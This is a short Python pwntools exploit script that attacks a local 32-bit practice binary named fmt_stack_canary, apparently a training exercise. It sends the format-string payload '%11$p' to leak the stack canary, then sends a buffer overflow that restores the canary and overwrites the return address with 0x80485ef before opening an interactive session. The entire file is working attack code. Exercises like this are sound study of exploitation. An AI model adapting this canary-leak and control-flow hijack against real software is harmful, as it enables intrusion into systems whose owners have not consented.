from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/32bit/formatstring_stackoverflow/fmt_stack_canary/fmt_stack_canary")
pwn.gdb.attach(p)
payload = b""
payload += b'%11$p\n\x00'
p.send(payload)
p.recvuntil(b'')
canary = int(p.recvuntil(b'\n', drop=True)[0:], 16) + 0x0
pwn.log.success('canary:' + hex(canary))
payload = b"\x00" * 16
payload += p32(canary + 0x0) + p32(0x0) + p32(0x0) + p32(0x0) + p32(0x80485ef)
p.send(payload)
p.interactive()
